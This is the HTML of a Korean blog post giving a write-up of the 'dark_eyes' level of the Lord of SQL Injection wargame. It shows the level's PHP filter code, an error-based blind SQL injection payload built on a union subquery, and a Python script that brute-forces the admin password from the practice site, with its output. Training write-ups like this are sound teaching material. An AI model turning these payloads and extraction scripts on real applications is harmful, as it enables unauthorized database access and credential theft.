@@ -1,0 +1,546 @@
+<!DOCTYPE html>
+<html class="no-js">
+  <head>
+	<meta charset="utf-8">
+	<title>[Lord of SQL Injection] LoS - dark_eyes 문제풀이 | mingzzi</title>
+	<meta name="description" content="이번에도 역시 Error를 기반으로 한 Error Based Blind SQL Injection 이다.그런데 이번에는 이 전 문제랑은 약간 다르다.">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+
+	<!-- CSS -->
+	<link rel="stylesheet" href="/assets/css/main.css">
+
+	<!--Favicon-->
+	<link rel="shortcut icon" href="/assets/favicon.ico" type="image/x-icon">
+
+	<!-- Canonical -->
+	<link rel="canonical" href="/wargame/lord%20of%20sql%20injection/2018/08/22/los-dark_eyes.html">
+
+	<!-- RSS -->
+	<link rel="alternate" type="application/atom+xml" title="mingzzi" href="/feed.xml" />
+
+	<!-- Font Awesome -->
+	<link href="//maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">
+
+	<!-- Google Fonts -->
+	
+	<link href="https://fonts.googleapis.com/css?family=Nanum+Gothic:400,700" rel="stylesheet">
+	
+
+	<!-- KaTeX -->
+	
+	<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/KaTeX/0.8.3/katex.min.css">
+	<script src="//cdnjs.cloudflare.com/ajax/libs/KaTeX/0.8.3/katex.min.js"></script>
+	
+
+	<!-- Google Analytics -->
+	
+	<script>
+	(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+	(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+	m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+	})(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+	ga('create', 'UA-130304424-1', 'auto');
+	ga('send', 'pageview');
+	</script>
+	
+</head>
+
+  <header class="site-header">
+	<div class="branding">
+		
+		<a href="/">
+			<img class="avatar" src="/assets/img/blogmark.png" alt=""/>
+		</a>
+		
+		<h1 class="site-title">
+			<a href="/">mingzzi</a>
+		</h1>
+		<nav class="site-nav">
+				<ul>
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+							<li>
+								<a class="page-link" href="/about/">
+									About
+								</a>
+							</li>
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+							<li>
+								<a class="page-link" href="/tags.html">
+									tags
+								</a>
+							</li>
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+						
+					
+
+					<!-- Search bar -->
+					
+					<li>
+					<form action="/search.html" method="get">
+						<input type="text" id="search-box" name="query" placeholder="Search" class="">
+						<button type="submit" class="">
+							<i class="fa fa-fw fa-search"></i>
+						</button>
+					</form>
+					</li>
+					
+				</ul>
+		</nav>
+	</div>
+
+	<div class="site-category">
+			<ul class='cat1'>
+				<li><a href="/">Home</a></li>
+				<li><a href="/">Pentesting</a>
+					<ul>
+						<li><a href="/Pentest/iOS">iOS</a></li>
+						<li><a href="/Pentest/Android">Android</a></li>
+						<li><a href="/Pentest/PWeb">Web</a></li>
+					</ul>
+				</li>
+
+				<li><a href="/">Wargame</a>
+					<ul>
+						<li><a href="/Wargame/LoS">Load of SQL Injection</a></li>
+						<li><a href="/Wargame/Pwnkr">Pwnable.kr</a></li>
+						<li><a href="/Wargame/Warkr">Wargame.kr</a></li>
+						<li><a href="/Wargame/XG">XSS Game</a></li>
+					</ul>
+				</li>
+
+				<li><a href="/">CTF</a>
+					<ul>
+						<li><a href="/CTF/2018">2018</a></li>
+						<li><a href="/CTF/2019">2019</a></li>
+					</ul>
+				</li>
+
+				<li><a href="/">Error</a>
+					<ul>
+						<li><a href="/Error/Linux">Linux</a></li>
+						<li><a href="/Error/Python">Python</a></li>
+					</ul>
+				</li>
+
+				<li><a href="/">Development</a>
+					<ul>
+						<li><a href="/Develop/Database">Database</a></li>
+						<li><a href="/Develop/Blog">Github Blog</a></li>
+						<li><a href="/Develop/DWeb">Web</a></li>
+						<li><a href="/Develop/Docker">Docker</a></li>
+						<li><a href="/Develop/Basic">Basic</a></li>
+					</ul>
+				</li>
+			</ul>
+		</div>
+
+</header>
+
+  <body>
+    <div class="content">
+      <article >
+  <header style="background-image: url('/')">
+    <h1 class="title">[Lord of SQL Injection] LoS - dark_eyes 문제풀이</h1>
+    
+    <p class="meta">
+      August 22, 2018
+      
+    </p>
+  </header>
+  <section class="post-content"><p>이번에도 역시 <code class="highlighter-rouge">Error</code>를 기반으로 한 <code class="highlighter-rouge">Error Based Blind SQL Injection</code> 이다.</p>
+
+<p>그런데 이번에는 이 전 문제랑은 약간 다르다.</p>
+
+<!--more-->
+
+<p>코드는 다음과 같다.</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code>------------------------------------------------------------------------------------------
+query : select id from prob_dark_eyes where id='admin' and pw=''
+------------------------------------------------------------------------------------------
+
+<span class="cp">&lt;?php</span>
+  <span class="k">include</span> <span class="s2">"./config.php"</span><span class="p">;</span> 
+  <span class="nx">login_chk</span><span class="p">();</span> 
+  <span class="nx">dbconnect</span><span class="p">();</span> 
+  <span class="k">if</span><span class="p">(</span><span class="nb">preg_match</span><span class="p">(</span><span class="s1">'/prob|_|\.|\(\)/i'</span><span class="p">,</span> <span class="nv">$_GET</span><span class="p">[</span><span class="nx">pw</span><span class="p">]))</span> <span class="k">exit</span><span class="p">(</span><span class="s2">"No Hack ~_~"</span><span class="p">);</span>
+  <span class="k">if</span><span class="p">(</span><span class="nb">preg_match</span><span class="p">(</span><span class="s1">'/col|if|case|when|sleep|benchmark/i'</span><span class="p">,</span> <span class="nv">$_GET</span><span class="p">[</span><span class="nx">pw</span><span class="p">]))</span> <span class="k">exit</span><span class="p">(</span><span class="s2">"HeHe"</span><span class="p">);</span>
+  <span class="nv">$query</span> <span class="o">=</span> <span class="s2">"select id from prob_dark_eyes where id='admin' and pw='</span><span class="si">{</span><span class="nv">$_GET</span><span class="p">[</span><span class="nx">pw</span><span class="p">]</span><span class="si">}</span><span class="s2">'"</span><span class="p">;</span>
+  <span class="nv">$result</span> <span class="o">=</span> <span class="o">@</span><span class="nb">mysql_fetch_array</span><span class="p">(</span><span class="nb">mysql_query</span><span class="p">(</span><span class="nv">$query</span><span class="p">));</span>
+  <span class="k">if</span><span class="p">(</span><span class="nb">mysql_error</span><span class="p">())</span> <span class="k">exit</span><span class="p">();</span>
+  <span class="k">echo</span> <span class="s2">"&lt;hr&gt;query : &lt;strong&gt;</span><span class="si">{</span><span class="nv">$query</span><span class="si">}</span><span class="s2">&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;"</span><span class="p">;</span>
+  
+  <span class="nv">$_GET</span><span class="p">[</span><span class="nx">pw</span><span class="p">]</span> <span class="o">=</span> <span class="nb">addslashes</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="nx">pw</span><span class="p">]);</span>
+  <span class="nv">$query</span> <span class="o">=</span> <span class="s2">"select pw from prob_dark_eyes where id='admin' and pw='</span><span class="si">{</span><span class="nv">$_GET</span><span class="p">[</span><span class="nx">pw</span><span class="p">]</span><span class="si">}</span><span class="s2">'"</span><span class="p">;</span>
+  <span class="nv">$result</span> <span class="o">=</span> <span class="o">@</span><span class="nb">mysql_fetch_array</span><span class="p">(</span><span class="nb">mysql_query</span><span class="p">(</span><span class="nv">$query</span><span class="p">));</span>
+  <span class="k">if</span><span class="p">((</span><span class="nv">$result</span><span class="p">[</span><span class="s1">'pw'</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="nv">$result</span><span class="p">[</span><span class="s1">'pw'</span><span class="p">]</span> <span class="o">==</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'pw'</span><span class="p">]))</span> <span class="nx">solve</span><span class="p">(</span><span class="s2">"dark_eyes"</span><span class="p">);</span>
+  <span class="nb">highlight_file</span><span class="p">(</span><span class="k">__FILE__</span><span class="p">);</span>
+<span class="cp">?&gt;</span>
+</code></pre></div></div>
+
+<p>이 전 문제에서 사용했던 <code class="highlighter-rouge">if</code>가 필터링 대상에 들어가 있고, <code class="highlighter-rouge">if</code>를 대체할 수 있는 <code class="highlighter-rouge">case</code>나 <code class="highlighter-rouge">when</code>도 필터링한다.</p>
+
+<p>즉, 조건문을 사용할 수가 없다.</p>
+
+<p>그래서 내가 처음에 생각했던 방법은 <code class="highlighter-rouge">and</code>와 <code class="highlighter-rouge">or</code>을 적절히 이용하는 것이다.</p>
+
+<p>만약에 <code class="highlighter-rouge">1 or 0</code>이라는 조건이 있다면, 앞의 <code class="highlighter-rouge">1</code>이 이미 참이기 때문에 뒤의 <code class="highlighter-rouge">0</code>은 체크하지 않는다고 생각했다.</p>
+
+<p>반면 <code class="highlighter-rouge">0 or 1</code>이라면, 앞의 <code class="highlighter-rouge">0</code>이 거짓이기 때문의 뒤의 <code class="highlighter-rouge">1</code>을 체크하는 것이다.</p>
+
+<p>그래서 앞에 <code class="highlighter-rouge">pw</code>의 길이와 내용을 알기 위한 쿼리를 넣고 뒤에 에러를 유발하는 쿼리문을 넣는다면, 앞의 조건이 참이라면 뒤의 에러 유발용 쿼리가 실행되지 않아 정상적으로 페이지가 보일 것이라고 생각했던 것이다.</p>
+
+<p>그런데 음… 내가 뭘 잘못 한 것인지 이건 아무리 해도 안됬다.</p>
+
+<p>정확히는 쿼리 스트링을 <code class="highlighter-rouge">pw=1' or id='admin' and ord('a')=97 or 9e307*2</code>를 넣으면 앞의 <code class="highlighter-rouge">id='admin' and ord('a')=97</code>가 참이기 때문에 뒤의 <code class="highlighter-rouge">9e307*2</code>에 대해서 에러가 발생하지 않는다.</p>
+
+<p>(9e307은 MySQL에서의 최대값이기 때문에 9e307*2를 하면 <code class="highlighter-rouge">DOUBLE value is out of range in '(9e307 * 2)'</code>라는 에러가 발생한다.)</p>
+
+<p>그런데 <code class="highlighter-rouge">pw=1' or id='admin' and length(pw)&gt;0 or 9e307*2</code>을 넣으면 무슨 조건을 넣더라도 무조건 에러가 나왔다.</p>
+
+<p>왜 이러는지 이유를 모르겠다 ㅠㅠ</p>
+
+<p>그래서 결국 다른 방법을 찾아보아서 아래와 같이 쿼리 스트링을 구성 해 문제를 풀었다.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>?pw=1' or id='admin' and (select 1 union select (length(pw)=1))#
+</code></pre></div></div>
+
+<p>이렇게 하면 만약 <code class="highlighter-rouge">length(pw)=1</code>이 참이라면 <code class="highlighter-rouge">1</code>을 반환하기 때문에 <code class="highlighter-rouge">select 1 union select 1</code>이 되어 한 행만 결과로 나온다.</p>
+
+<p>하지만 거짓이라면 <code class="highlighter-rouge">select 1 union select 0</code>을 하게 되면, 2개의 행을 반환하기 때문에 <code class="highlighter-rouge">Subquery returns more than 1 row</code>라는 오류를 출력한다.</p>
+
+<p>이를 바탕으로 <code class="highlighter-rouge">pw</code>를 알아내기 위해 아래와 같이 코드를 구현했다.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">urllib2</span>
+<span class="kn">import</span> <span class="nn">urllib</span>
+<span class="kn">import</span> <span class="nn">requests</span>
+
+<span class="n">flag</span> <span class="o">=</span> <span class="s">""</span>
+<span class="n">length</span> <span class="o">=</span> <span class="mi">0</span>
+
+<span class="n">url</span> <span class="o">=</span> <span class="s">"http://los.rubiya.kr/dark_eyes_4e0c557b6751028de2e64d4d0020e02c.php?pw="</span>
+<span class="n">session</span> <span class="o">=</span> <span class="nb">dict</span><span class="p">(</span><span class="n">PHPSESSID</span> <span class="o">=</span> <span class="s">"YOUR SESSION ID"</span><span class="p">)</span>
+
+<span class="k">print</span> <span class="s">"[+] Start"</span>
+
+<span class="k">print</span> <span class="s">"[+] Find length of the password"</span>
+
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">20</span><span class="p">):</span>
+	<span class="k">try</span><span class="p">:</span>
+		<span class="n">query</span> <span class="o">=</span> <span class="n">url</span> <span class="o">+</span> <span class="s">"1' or id='admin' and (select 1 union select (length(pw)="</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="p">)</span> <span class="o">+</span> <span class="s">"))</span><span class="si">%23</span><span class="s">"</span>
+		<span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">query</span><span class="p">,</span> <span class="n">cookies</span><span class="o">=</span><span class="n">session</span><span class="p">)</span>
+	<span class="k">except</span><span class="p">:</span>
+		<span class="k">print</span> <span class="s">"[-] Error occur"</span>
+		<span class="k">continue</span>
+
+	<span class="k">if</span> <span class="s">'select id from prob_dark_eyes'</span> <span class="ow">in</span> <span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">:</span>
+		<span class="n">length</span> <span class="o">=</span> <span class="n">i</span>
+		<span class="k">break</span>
+
+<span class="k">print</span> <span class="s">"[+] Found length : "</span><span class="p">,</span> <span class="n">length</span>
+
+<span class="k">print</span> <span class="s">"[+] Find password"</span>
+
+<span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">length</span> <span class="o">+</span> <span class="mi">1</span><span class="p">):</span>
+	<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">48</span><span class="p">,</span> <span class="mi">128</span><span class="p">):</span>
+		<span class="k">try</span><span class="p">:</span>
+			<span class="n">query</span> <span class="o">=</span> <span class="n">url</span> <span class="o">+</span> <span class="s">"1' or id='admin' and (select 1 union select (ord(substr(pw, "</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">j</span><span class="p">)</span> <span class="o">+</span> <span class="s">", 1))="</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="p">)</span> <span class="o">+</span> <span class="s">"))</span><span class="si">%23</span><span class="s">"</span>
+			<span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">query</span><span class="p">,</span> <span class="n">cookies</span><span class="o">=</span><span class="n">session</span><span class="p">)</span>
+		<span class="k">except</span><span class="p">:</span>
+			<span class="k">print</span> <span class="s">"[-] Error occur"</span>
+			<span class="k">continue</span>
+
+		<span class="k">if</span> <span class="s">'select id from prob_dark_eyes'</span> <span class="ow">in</span> <span class="n">r</span><span class="o">.</span><span class="n">text</span><span class="p">:</span>
+			<span class="n">flag</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
+			<span class="k">print</span> <span class="s">"[+] Found "</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">j</span><span class="p">),</span> <span class="s">":"</span><span class="p">,</span> <span class="n">flag</span>
+			<span class="k">break</span>
+
+<span class="k">print</span> <span class="s">"[+] Found password : "</span><span class="p">,</span> <span class="n">flag</span>
+<span class="k">print</span> <span class="s">"[+] End"</span>
+</code></pre></div></div>
+
+<p>그 결과 소문자와 숫자로 구성 된 8자리 <code class="highlighter-rouge">pw</code>값을 얻을 수 있었다.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ python ex.py 
+[+] Start
+[+] Find length of the password
+[+] Found length :  8
+[+] Find password
+[+] Found 1 : 5
+[+] Found 2 : 5a
+[+] Found 3 : 5a2
+[+] Found 4 : 5a2f
+[+] Found 5 : 5a2f5
+[+] Found 6 : 5a2f5d
+[+] Found 7 : 5a2f5d3
+[+] Found 8 : 5a2f5d3c
+[+] Found password :  5a2f5d3c
+[+] End
+</code></pre></div></div>
+
+<p>이 값을 쿼리스트링으로 넘겨주면 문제를 풀 수 있다.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>?pw=5a2f5d3c
+</code></pre></div></div>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code>----------------------------------------------------------------------------------------------------
+query : select id from prob_dark_eyes where id='admin' and pw='5a2f5d3c'
+----------------------------------------------------------------------------------------------------
+
+DARK_EYES Clear!
+<span class="cp">&lt;?php</span>
+  <span class="k">include</span> <span class="s2">"./config.php"</span><span class="p">;</span> 
+  <span class="nx">login_chk</span><span class="p">();</span> 
+  <span class="nx">dbconnect</span><span class="p">();</span> 
+  <span class="k">if</span><span class="p">(</span><span class="nb">preg_match</span><span class="p">(</span><span class="s1">'/prob|_|\.|\(\)/i'</span><span class="p">,</span> <span class="nv">$_GET</span><span class="p">[</span><span class="nx">pw</span><span class="p">]))</span> <span class="k">exit</span><span class="p">(</span><span class="s2">"No Hack ~_~"</span><span class="p">);</span>
+  <span class="k">if</span><span class="p">(</span><span class="nb">preg_match</span><span class="p">(</span><span class="s1">'/col|if|case|when|sleep|benchmark/i'</span><span class="p">,</span> <span class="nv">$_GET</span><span class="p">[</span><span class="nx">pw</span><span class="p">]))</span> <span class="k">exit</span><span class="p">(</span><span class="s2">"HeHe"</span><span class="p">);</span>
+  <span class="nv">$query</span> <span class="o">=</span> <span class="s2">"select id from prob_dark_eyes where id='admin' and pw='</span><span class="si">{</span><span class="nv">$_GET</span><span class="p">[</span><span class="nx">pw</span><span class="p">]</span><span class="si">}</span><span class="s2">'"</span><span class="p">;</span>
+  <span class="nv">$result</span> <span class="o">=</span> <span class="o">@</span><span class="nb">mysql_fetch_array</span><span class="p">(</span><span class="nb">mysql_query</span><span class="p">(</span><span class="nv">$query</span><span class="p">));</span>
+  <span class="k">if</span><span class="p">(</span><span class="nb">mysql_error</span><span class="p">())</span> <span class="k">exit</span><span class="p">();</span>
+  <span class="k">echo</span> <span class="s2">"&lt;hr&gt;query : &lt;strong&gt;</span><span class="si">{</span><span class="nv">$query</span><span class="si">}</span><span class="s2">&lt;/strong&gt;&lt;hr&gt;&lt;br&gt;"</span><span class="p">;</span>
+  
+  <span class="nv">$_GET</span><span class="p">[</span><span class="nx">pw</span><span class="p">]</span> <span class="o">=</span> <span class="nb">addslashes</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="nx">pw</span><span class="p">]);</span>
+  <span class="nv">$query</span> <span class="o">=</span> <span class="s2">"select pw from prob_dark_eyes where id='admin' and pw='</span><span class="si">{</span><span class="nv">$_GET</span><span class="p">[</span><span class="nx">pw</span><span class="p">]</span><span class="si">}</span><span class="s2">'"</span><span class="p">;</span>
+  <span class="nv">$result</span> <span class="o">=</span> <span class="o">@</span><span class="nb">mysql_fetch_array</span><span class="p">(</span><span class="nb">mysql_query</span><span class="p">(</span><span class="nv">$query</span><span class="p">));</span>
+  <span class="k">if</span><span class="p">((</span><span class="nv">$result</span><span class="p">[</span><span class="s1">'pw'</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="nv">$result</span><span class="p">[</span><span class="s1">'pw'</span><span class="p">]</span> <span class="o">==</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'pw'</span><span class="p">]))</span> <span class="nx">solve</span><span class="p">(</span><span class="s2">"dark_eyes"</span><span class="p">);</span>
+  <span class="nb">highlight_file</span><span class="p">(</span><span class="k">__FILE__</span><span class="p">);</span>
+<span class="cp">?&gt;</span>
+</code></pre></div></div>
+
+<p><code class="highlighter-rouge">DARK_EYES Clear!!</code></p>
+</section>
+  
+<footer>
+  <div class="tags">
+    
+    <a class="tag" href="/tags#Write-up">#Write-up</a>
+    
+    <a class="tag" href="/tags#Lord of SQL Injection">#Lord of SQL Injection</a>
+    
+  </div>
+</footer>
+
+
+</article>
+<!-- Disqus -->
+<a href="https://devYurim.github.io/wargame/lord%20of%20sql%20injection/2018/08/22/los-dark_eyes.html#disqus_thread"></a>
+
+<div class="comments">
+  
+<div id="disqus_thread"></div>
+<script>
+
+/**
+*  RECOMMENDED CONFIGURATION VARIABLES: EDIT AND UNCOMMENT THE SECTION BELOW TO INSERT DYNAMIC VALUES FROM YOUR PLATFORM OR CMS.
+*  LEARN WHY DEFINING THESE VARIABLES IS IMPORTANT: https://disqus.com/admin/universalcode/#configuration-variables*/
+/*
+var disqus_config = function () {
+this.page.url = PAGE_URL;  // Replace PAGE_URL with your page's canonical URL variable
+this.page.identifier = PAGE_IDENTIFIER; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
+};
+*/
+(function() { // DON'T EDIT BELOW THIS LINE
+var d = document, s = d.createElement('script');
+s.src = 'https://https-devyurim-github-io-1.disqus.com/embed.js';
+s.setAttribute('data-timestamp', +new Date());
+(d.head || d.body).appendChild(s);
+})();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+                            
+
+</div>
+
+
+<!-- Post navigation -->
+
+  <div id="post-nav">
+  
+  <div id="previous-post" class="post-nav-post">
+      <p>Previous post</p>
+      <a href="/wargame/lord%20of%20sql%20injection/2018/08/16/los-iron_golem.html">
+        [Lord of SQL Injection] LoS - iron_golem 문제풀이
+      </a>
+  </div>
+  
+  
+  <div id="next-post" class="post-nav-post">
+      <p>Next post</p>
+      <a href="/wargame/lord%20of%20sql%20injection/2018/08/23/los-hell_fire.html">
+        [Lord of SQL Injection] LoS - hell_fire 문제풀이
+      </a>
+  </div>
+  
+</div>
+
+
+
+    </div>
+    
+<script src="/assets/js/katex_init.js"></script>
+
+
+
+<footer class="site-footer">
+	<p class="text">Powered by <a href="https://jekyllrb.com/">Jekyll</a> with <a href="https://github.com/rohanchandra/type-theme">Type Theme</a>
+</p>
+</footer>
+
+
+    <script id="dsq-count-scr" src="//.disqus.com/count.js" async></script>
+
+    <!-- Google Analytics Tracking code -->
+<script type="text/javascript">
+    var _gaq = _gaq || [];
+    _gaq.push(['_setAccount', '']);
+    _gaq.push(['_trackPageview']);
+    (function() {
+        var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
+        ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
+        var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
+    })();
+</script>
+
+  </body>
+</html>
